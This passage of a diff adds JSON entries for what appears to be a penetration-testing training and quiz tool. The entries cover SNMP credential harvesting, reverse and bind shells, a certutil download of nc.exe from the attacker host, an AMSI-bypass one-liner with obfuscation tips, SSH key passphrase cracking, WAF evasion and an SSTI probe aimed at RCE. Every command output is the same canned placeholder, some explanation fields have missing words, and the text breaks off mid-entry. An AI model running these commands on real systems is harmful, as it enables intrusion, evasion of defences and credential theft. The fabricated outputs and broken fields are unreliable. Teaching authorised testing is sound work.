+      "cmd": "snmpbulkwalk -v2c -c {{community}} {{target}} 1.3.6.1.2.1.25.4.2.1.2",
+      "tool": "snmpbulkwalk",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Complete process inventory obtained from target host.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute SNMP Process Table Command-Line Credential Harvesting (hrSWRun), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Query Host Resources MIB hrSWRunName branch using bulk walk.",
+            "demo": [
+              {
+                "run": "snmpbulkwalk -v2c -c {{community}} {{target}} 1.3.6.1.2.1.25.4.2.1.2",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Complete process inventory obtained from target host."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Query hrSWRunParameters branch dumping complete argument strings.",
+            "demo": [
+              {
+                "run": "snmpbulkwalk -v2c -c {{community}} {{target}} 1.3.6.1.2.1.25.4.2.1.5",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Cleartext credentials recovered from command-line parameters."
+          }
+        ]
+      },
+      "situation": "Scenario: SNMP service is discovered and you want an overview of active running process names. Which move should you run next?",
+      "choices": [
+        "snmp-process-cmdline-harvest",
+        "nmap-fast-open-ports",
+        "nmap-version-scripts",
+        "nmap-vuln-scripts"
+      ],
+      "coach": {
+        "nmap-fast-open-ports": "Nmap Fast TCP Open-Port Discovery targets confirms a reachable host, a fast nmap open-port sweep, and the set of open ports; here the direct move is SNMP Process Table Command-Line Credential Harvesting (hrSWRun).",
+        "nmap-version-scripts": "Nmap Targeted Service and Default Script Scan targets produces nmap service and version evidence for the ports already found open; here the direct move is SNMP Process Table Command-Line Credential Harvesting (hrSWRun).",
+        "nmap-vuln-scripts": "Nmap NSE Vulnerability Script Scan targets runs nmap's vuln-category nse detection scripts against the open ports and records any vulnerable verdicts as candidates; here the direct move is SNMP Process Table Command-Line Credential Harvesting (hrSWRun)."
+      }
+    },
+    "egress-blocked-shell": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once your payload ran but nothing reached your listener, or a test connection is refused or times out. The key confirmation is: The shell connects back once you switch to a port egress allows.",
+      "cmd": "sudo nc -lvnp 443   # and point the payload at {{lhost}}:443",
+      "tool": "nc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The shell connects back once you switch to a port egress allows.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Reverse Shell Never Connects - Egress Is Filtered, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Move the listener to 443, then 53. Outbound web and DNS almost always leave even a filtered network.",
+            "demo": [
+              {
+                "run": "sudo nc -lvnp 443   # and point the payload at {{lhost}}:443",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The shell connects back once you switch to a port egress allows."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Flip the direction: have the TARGET listen with a bind shell, then connect to it from Kali.",
+            "demo": [
+              {
+                "run": "# on the TARGET: nc -lvnp 4444 -e /bin/bash   # then from Kali: nc {{target}} 4444",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You connect inbound to the target and get a prompt."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Check that box own egress and listeners so you pick a port that actually works instead of guessing.",
+            "demo": [
+              {
+                "run": "ss -tlnp; iptables -L -n   # (from any foothold) confirm what egress/listeners exist",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "You see exactly which ports leave, and aim the payload there."
+          }
+        ]
+      },
+      "situation": "Scenario: Your payload ran but nothing reached your listener, or a test connection is refused or times out. Which move should you run next?",
+      "choices": [
+        "egress-blocked-shell",
+        "certutil-usage-doctor",
+        "fix-no-tty",
+        "fix-tool-wont-run"
+      ],
+      "coach": {
+        "certutil-usage-doctor": "Certutil Rejected Your Arguments targets nothing attack-wise; it gets the file transfer or encode command to actually run; here the direct move is Reverse Shell Never Connects - Egress Is Filtered.",
+        "fix-no-tty": "No TTY - Upgrade to a Real Shell targets nothing attack-wise; it turns a dumb shell into an interactive pty so terminal-only commands run; here the direct move is Reverse Shell Never Connects - Egress Is Filtered.",
+        "fix-tool-wont-run": "Your Uploaded Tool Won't Run - Fix It targets nothing attack-wise; it gets your own tooling running on the foothold; here the direct move is Reverse Shell Never Connects - Egress Is Filtered."
+      }
+    },
+    "certutil-usage-doctor": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once certutil answered with 'Too many arguments' or 'Expected no more than N args', so nothing was fetched. The key confirmation is: The file transfers once the arguments are in the right order.",
+      "cmd": "certutil -urlcache -split -f http://{{lhost}}/nc.exe C:\\Windows\\Temp\\nc.exe",
+      "tool": "certutil",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The file transfers once the arguments are in the right order.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Certutil Rejected Your Arguments, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Put the URL first and the output path last, and keep the -f: certutil -urlcache -split -f http://{{lhost}}/nc.exe C:\\Windows\\Temp\\nc.exe.",
+            "demo": [
+              {
+                "run": "certutil -urlcache -split -f http://{{lhost}}/nc.exe C:\\Windows\\Temp\\nc.exe",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The file transfers once the arguments are in the right order."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Base64-encode on the source: certutil -encode loot.zip loot.b64, then move the text across.",
+            "demo": [
+              {
+                "run": "certutil -encode loot.zip loot.b64   # on the SOURCE, then move the text",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The file becomes text you can paste or transfer through a limited channel."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Decode it back: certutil -decode loot.b64 loot.zip.",
+            "demo": [
+              {
+                "run": "certutil -decode loot.b64 loot.zip   # on the TARGET",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The transferred text becomes the working file again."
+          }
+        ]
+      },
+      "situation": "Scenario: Certutil answered with 'Too many arguments' or 'Expected no more than N args', so nothing was fetched. Which move should you run next?",
+      "choices": [
+        "certutil-usage-doctor",
+        "egress-blocked-shell",
+        "fix-no-tty",
+        "fix-tool-wont-run"
+      ],
+      "coach": {
+        "egress-blocked-shell": "Reverse Shell Never Connects - Egress Is Filtered targets nothing attack-wise; it gets a shell channel through a filtered egress; here the direct move is Certutil Rejected Your Arguments.",
+        "fix-no-tty": "No TTY - Upgrade to a Real Shell targets nothing attack-wise; it turns a dumb shell into an interactive pty so terminal-only commands run; here the direct move is Certutil Rejected Your Arguments.",
+        "fix-tool-wont-run": "Your Uploaded Tool Won't Run - Fix It targets nothing attack-wise; it gets your own tooling running on the foothold; here the direct move is Certutil Rejected Your Arguments."
+      }
+    },
+    "fix-no-tty": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once you hit \"sudo: no tty present\" or \"must be run from a terminal\". The key confirmation is: sudo prompts for a password instead of erroring about a tty.",
+      "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "tool": "python3",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "sudo prompts for a password instead of erroring about a tty.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute No TTY - Upgrade to a Real Shell, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Spawn a PTY with python (python2 works too). No python? Use script -qc /bin/bash /dev/null.",
+            "demo": [
+              {
+                "run": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "sudo prompts for a password instead of erroring about a tty."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Finish the upgrade: Ctrl-Z, on Kali run stty raw -echo then fg, then export TERM=xterm and set rows and cols.",
+            "demo": [
+              {
+                "run": "# Ctrl-Z, then on Kali: stty raw -echo; fg ; then in the shell: export TERM=xterm; stty rows 50 cols 200",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "A full interactive terminal with history and editing."
+          }
+        ]
+      },
+      "situation": "Scenario: You hit \"sudo: no tty present\" or \"must be run from a terminal\". Which move should you run next?",
+      "choices": [
+        "fix-no-tty",
+        "egress-blocked-shell",
+        "certutil-usage-doctor",
+        "fix-tool-wont-run"
+      ],
+      "coach": {
+        "egress-blocked-shell": "Reverse Shell Never Connects - Egress Is Filtered targets nothing attack-wise; it gets a shell channel through a filtered egress; here the direct move is No TTY - Upgrade to a Real Shell.",
+        "certutil-usage-doctor": "Certutil Rejected Your Arguments targets nothing attack-wise; it gets the file transfer or encode command to actually run; here the direct move is No TTY - Upgrade to a Real Shell.",
+        "fix-tool-wont-run": "Your Uploaded Tool Won't Run - Fix It targets nothing attack-wise; it gets your own tooling running on the foothold; here the direct move is No TTY - Upgrade to a Real Shell."
+      }
+    },
+    "fix-tool-wont-run": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once \"bad interpreter: No such file or directory\" on a script you uploaded. The key confirmation is: The script executes normally after the CRLF strip.",
+      "cmd": "dos2unix {{script}}  # or: sed -i 's/\\r$//' {{script}}",
+      "tool": "dos2unix",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The script executes normally after the CRLF strip.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Your Uploaded Tool Won't Run - Fix It, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Strip Windows CRLF line endings with dos2unix (or sed). The kernel was looking for an interpreter literally named /bin/bash followed by a carriage return.",
+            "demo": [
+              {
+                "run": "dos2unix {{script}}  # or: sed -i 's/\\r$//' {{script}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The script executes normally after the CRLF strip."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "/tmp is probably mounted noexec. Run it from /dev/shm or another exec-allowed path instead.",
+            "demo": [
+              {
+                "run": "chmod +x {{binary}}; mv {{binary}} /dev/shm/ && /dev/shm/{{binary}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The tool executes once moved off the noexec mount."
+          }
+        ]
+      },
+      "situation": "Scenario: \"bad interpreter: No such file or directory\" on a script you uploaded. Which move should you run next?",
+      "choices": [
+        "fix-tool-wont-run",
+        "egress-blocked-shell",
+        "certutil-usage-doctor",
+        "fix-no-tty"
+      ],
+      "coach": {
+        "egress-blocked-shell": "Reverse Shell Never Connects - Egress Is Filtered targets nothing attack-wise; it gets a shell channel through a filtered egress; here the direct move is Your Uploaded Tool Won't Run - Fix It.",
+        "certutil-usage-doctor": "Certutil Rejected Your Arguments targets nothing attack-wise; it gets the file transfer or encode command to actually run; here the direct move is Your Uploaded Tool Won't Run - Fix It.",
+        "fix-no-tty": "No TTY - Upgrade to a Real Shell targets nothing attack-wise; it turns a dumb shell into an interactive pty so terminal-only commands run; here the direct move is Your Uploaded Tool Won't Run - Fix It."
+      }
+    },
+    "bypass-amsi": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: Your runs after the in-memory",
+      "cmd": "[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
+      "tool": "powershell",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Your payload runs after the in-memory patch.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Defender / AMSI Ate the Payload, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Patch AMSI in your CURRENT PowerShell session (the canvas shows the string-split one-liner), then re-run your payload.",
+            "demo": [
+              {
+                "run": "[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Your payload runs after the in-memory patch."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Obfuscate (rename variables, base64 and IEX), use a fresh or rewritten tool, or drop to a living-off-the-land path that is not signatured.",
+            "demo": [
+              {
+                "run": "Invoke-Obfuscation / change the payload",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The action completes via an unsignatured path."
+          }
+        ]
+      },
+      "situation": "Scenario: \"This script contains malicious content\" or \"contains a virus\": AMSI or Defender flagged a known signature, not a broken technique. Which move should you run next?",
+      "choices": [
+        "bypass-amsi",
+        "egress-blocked-shell",
+        "certutil-usage-doctor",
+        "fix-no-tty"
+      ],
+      "coach": {
+        "egress-blocked-shell": "Reverse Shell Never Connects - Egress Is Filtered targets nothing attack-wise; it gets a shell channel through a filtered egress; here the direct move is Defender / AMSI Ate the Payload.",
+        "certutil-usage-doctor": "Certutil Rejected Your Arguments targets nothing attack-wise; it gets the file transfer or encode command to actually run; here the direct move is Defender / AMSI Ate the Payload.",
+        "fix-no-tty": "No TTY - Upgrade to a Real Shell targets nothing attack-wise; it turns a dumb shell into an interactive pty so terminal-only commands run; here the direct move is Defender / AMSI Ate the Payload."
+      }
+    },
+    "ssh-key-troubleshoot": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once \"UNPROTECTED PRIVATE KEY FILE\" or \"permissions are too open\". The key confirmation is: The permissions warning is gone.",
+      "cmd": "chmod 600 {{keyfile}}",
+      "tool": "ssh",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The permissions warning is gone.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute SSH Key Rejected - Fix It, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "chmod 600 the key. This is client-side, on YOUR Kali, not the target.",
+            "demo": [
+              {
+                "run": "chmod 600 {{keyfile}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The permissions warning is gone."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "OpenSSH 8.8+ disabled ssh-rsa by default. Re-enable it for this one connection with the PubkeyAcceptedKeyTypes and HostKeyAlgorithms flags.",
+            "demo": [
+              {
+                "run": "ssh -i {{keyfile}} -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa {{user}}@{{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "SSH negotiates the algorithm and the key is tried."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Crack the passphrase offline: ssh2john, then john with a wordlist. If you are not sure of the hash, drop it into the Workbench Hash ID.",
+            "demo": [
+              {
+                "run": "ssh2john {{keyfile}} > key.hash && john --wordlist={{wordlist}} key.hash",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The cracked passphrase unlocks the key."
+          }
+        ]
+      },
+      "situation": "Scenario: \"UNPROTECTED PRIVATE KEY FILE\" or \"permissions are too open\". Which move should you run next?",
+      "choices": [
+        "ssh-key-troubleshoot",
+        "egress-blocked-shell",
+        "certutil-usage-doctor",
+        "fix-no-tty"
+      ],
+      "coach": {
+        "egress-blocked-shell": "Reverse Shell Never Connects - Egress Is Filtered targets nothing attack-wise; it gets a shell channel through a filtered egress; here the direct move is SSH Key Rejected - Fix It.",
+        "certutil-usage-doctor": "Certutil Rejected Your Arguments targets nothing attack-wise; it gets the file transfer or encode command to actually run; here the direct move is SSH Key Rejected - Fix It.",
+        "fix-no-tty": "No TTY - Upgrade to a Real Shell targets nothing attack-wise; it turns a dumb shell into an interactive pty so terminal-only commands run; here the direct move is SSH Key Rejected - Fix It."
+      }
+    },
+    "web-access-blocked": {
+      "why": "Your web scan is being refused by a rate limit, a WAF, a wrong scheme, or a catch-all page, not because there is nothing there. This gets the scan working again so you can keep mapping the site toward a foothold. In practice, you reach for this step when when a scan returns 429s or suddenly all errors: a rate limit or WAF is throttling you. Success looks like: The scan runs steadily again without 429s.",
+      "cmd": "ffuf -u {{url}}/FUZZ -w {{wordlist}} -t 5 -p 0.3 -H \"User-Agent: Mozilla/5.0\"",
+      "tool": "ffuf",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The scan runs steadily again without 429s.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Your web scan is being refused by a rate limit, a WAF, a wrong scheme, or a catch-all page, not because there is nothing there.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Drop the thread count, add a small delay, and send a real User-Agent. A slow scan that finishes beats a fast one that gets you blocked.",
+            "demo": [
+              {
+                "run": "ffuf -u {{url}}/FUZZ -w {{wordlist}} -t 5 -p 0.3 -H \"User-Agent: Mozilla/5.0\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The scan runs steadily again without 429s."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "You spoke TLS to a plaintext port, or the reverse. Flip the scheme, and add -k for a self-signed cert.",
+            "demo": [
+              {
+                "run": "curl -sk https://{{target}}/  # or plain http://",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The page loads once the scheme matches the port."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Measure the decoy response and filter it out by size or words, or blacklist its status code; real paths then stand out.",
+            "demo": [
+              {
+                "run": "ffuf -u {{url}}/FUZZ -w {{wordlist}} -fs {{wildcard_size}}   # or gobuster -b 404,302 / --wildcard",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Genuine paths reappear once the catch-all is filtered."
+          }
+        ]
+      },
+      "situation": "Scenario: When a scan returns 429s or suddenly all errors: a rate limit or WAF is throttling you. Which move should you run next?",
+      "choices": [
+        "web-access-blocked",
+        "vhost-discovery",
+        "content-discovery",
+        "param-discovery"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Web Request Blocked - WAF, Rate Limit, or Wrong Scheme.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Web Request Blocked - WAF, Rate Limit, or Wrong Scheme.",
+        "param-discovery": "Parameter Discovery (arjun) targets surfaces the request parameters an endpoint actually accepts; here the direct move is Web Request Blocked - WAF, Rate Limit, or Wrong Scheme."
+      }
+    },
+    "ssti-to-rce": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The is identified.",
+      "cmd": "curl -s -G {{url}} --data-urlencode \"name=\\{\\{7*7\\}\\}\"",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The template engine is identified.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Once template injection is confirmed, this turns the 7*7 detector into a real command run, and then a shell, using the gadget for the specific engine the app uses.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Confirm the engine: 49 is Jinja2/Twig-style, 7777777 is Twig concat, an error names the engine. That tells you which RCE gadget to use next.",
+            "demo": [
+              {
+                "run": "curl -s -G {{url}} --data-urlencode \"name=\\{\\{7*7\\}\\}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The template engine is identified."
+          },
+          {
+            "t": "Alternative tool or locus variant",
